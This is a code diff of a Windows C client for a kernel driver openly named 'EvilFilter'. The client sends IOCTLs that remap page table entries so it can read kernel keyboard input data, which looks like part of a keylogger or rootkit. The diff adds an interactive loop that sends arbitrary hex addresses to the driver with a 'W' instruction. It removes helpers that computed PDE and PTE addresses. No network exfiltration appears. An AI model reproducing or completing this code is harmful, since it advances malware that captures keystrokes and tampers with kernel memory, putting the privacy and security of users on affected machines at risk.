@@ -4,8 +4,44 @@
 #include "stdafx.h"
 #include <windows.h>
 #include <SharedHeader.h>
-
 #include <ntsecapi.h>
+
+#define ASCII_0_VALU 48
+#define ASCII_9_VALU 57
+#define ASCII_A_VALU 65
+#define ASCII_F_VALU 70
+
+unsigned long HexStringToUInt(char * hexstring)
+{
+	unsigned long result = 0;
+	char const *c = hexstring;
+	char thisC;
+
+	while ((thisC = *c) != NULL)
+	{
+		unsigned int add;
+		thisC = toupper(thisC);
+
+		result <<= 4;
+
+		if (thisC >= ASCII_0_VALU &&  thisC <= ASCII_9_VALU)
+			add = thisC - ASCII_0_VALU;
+		else if (thisC >= ASCII_A_VALU && thisC <= ASCII_F_VALU)
+			add = thisC - ASCII_A_VALU + 10;
+		else
+		{
+			printf("Unrecognised hex character \"%c\"\n", thisC);
+			exit(-1);
+		}
+
+		result += add;
+		++c;
+	}
+
+	return result;
+}
+
+
 
 
 VOID pauseForABit(WORD secondsDelay) {
@@ -61,14 +97,8 @@ int main(int argc, _TCHAR* argv[]) {
 	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
 	HANDLE hControlDevice;
 	ULONG  bytes;
-
-	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
-		GENERIC_READ | GENERIC_WRITE, 
-		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
-		NULL, // no SECURITY_ATTRIBUTES structure
-		OPEN_EXISTING, // No special create flags
-		0, //  No special attributes
-		NULL); // No template file
+	
+	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING,0,NULL);
 
 	if (INVALID_HANDLE_VALUE == hControlDevice) {
 		printf("Failed to open EvilFilter device\n");
@@ -81,20 +111,32 @@ int main(int argc, _TCHAR* argv[]) {
 
 		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
 		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
+		PCHAR sAddress = (PCHAR)malloc(sizeof(CHAR) * 20);
+		while (TRUE) {
+			printf("enter address:");
+			gets_s(sAddress, 20);
+			ULONG lAddress = HexStringToUInt(sAddress);
+			dataToTransmit->instruction = 'W';
+			dataToTransmit->offset = lAddress;
+			DeviceIoOverlapped.Offset = 0;
+			DeviceIoOverlapped.OffsetHigh = 0;
+			DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
+				printf("Ioctl to EvilFilter device failed\n");
+			}
+			else {
+				printf("success!\n");
+			}
+		}
 
 		dataToTransmit->instruction = 'O';
 		dataToTransmit->offset = 0;
-
 		DeviceIoOverlapped.Offset = 0;
 		DeviceIoOverlapped.OffsetHigh = 0;
 		DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
 
-		if (!DeviceIoControl(hControlDevice,
-			IOCTL_CUSTOM_CODE,
-			NULL, 0,
-			dataToTransmit, SharedMemoryLength,
-			&bytes, &DeviceIoOverlapped)) {
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
 			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
 		}
 		else {
@@ -133,18 +175,13 @@ int main(int argc, _TCHAR* argv[]) {
 				}
 				free(currentListNode);
 			}
-			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\nAbout to transmit request to driver\n", GetPteAddress(keyboardData), GetPdeAddress(keyboardData));
 			dataToTransmit->ClientMemory = keyboardData;
 			dataToTransmit->instruction = 'E';
 
 			pauseForABit(10);
 			printf("\nTransmitting\n");
 			pauseForABit(5);
-			if (!DeviceIoControl(hControlDevice,
-				IOCTL_CUSTOM_CODE,
-				NULL, 0,
-				dataToTransmit, SharedMemoryLength,
-				&bytes, &DeviceIoOverlapped)) {
+			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
 				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
 			}
 			else {
@@ -154,11 +191,7 @@ int main(int argc, _TCHAR* argv[]) {
 
 				printf("\nDouble checking with the driver that the address is correct\n");
 				pauseForABit(5);
-				if (!DeviceIoControl(hControlDevice,
-					IOCTL_CUSTOM_CODE,
-					NULL, 0,
-					dataToTransmit, SharedMemoryLength,
-					&bytes, &DeviceIoOverlapped)) {
+				if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
 					printf("Ioctl to EvilFilter device failed - unable to query driver\n");
 				}
 				else {
@@ -174,87 +207,3 @@ int main(int argc, _TCHAR* argv[]) {
 	printf("fin\n");
 	return 0;
 }
-
-
-PVOID GetPdeAddress(PVOID virtualaddr) {
-	ULONG pageDirectoryIndex = GetPageDirectoryIndex(virtualaddr);
-	PVOID pageDirectory = (PVOID)(getPageDirectoryBase() + (pageDirectoryIndex * getPdeSize()));
-	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
-	if ((pageDirectory)) {
-		return pageDirectory;
-	}
-	else {
-		printf(" is INVALID\n");
-		return NULL;
-	}
-}
-
-PVOID GetPteAddress(PVOID virtualaddr) {
-	ULONG pageDirectoryIndex = GetPageDirectoryIndex(virtualaddr);
-	ULONG pageTableIndex = GetPageTableIndex(virtualaddr);
-	PVOID pageTable = (PVOID)(getPageTableBase() + (pageTableIndex * getPteSize()) + (PAGE_SIZE * pageDirectoryIndex));
-	printf("pageTable   [0x%lx] \n", pageTable);
-	if ((pageTable)) {
-		return pageTable;
-	}
-	else {
-		printf(" is INVALID\n");
-		return NULL;
-	}
-}
-
-ULONG getPdeSize() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PDE_SIZE;
-	}
-	else {
-		return X32_PDE_SIZE;
-	}
-}
-ULONG getPteSize() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PTE_SIZE;
-	}
-	else {
-		return X32_PTE_SIZE;
-	}
-}
-
-
-ULONG getPageDirectoryBase() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PROCESS_PAGE_DIRECTORY_BASE;
-	}
-	else {
-		return X32_PROCESS_PAGE_DIRECTORY_BASE;
-	}
-}
-
-ULONG getPageTableBase() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PROCESS_PAGE_TABLE_BASE;
-	}
-	else {
-		return X32_PROCESS_PAGE_TABLE_BASE;
-	}
-}
-
-ULONG GetPageTableIndex(PVOID virtualaddr) {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return (ULONG)virtualaddr >> 12 & 0x01FF;
-	}
-	else {
-		return (ULONG)virtualaddr >> 12 & 0x03FF;
-	}
-}
-ULONG GetPageDirectoryIndex(PVOID virtualaddr) {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return (ULONG)virtualaddr >> 21;
-	}
-	else {
-		return (ULONG)virtualaddr >> 22;
-	}
-}
-
-
-
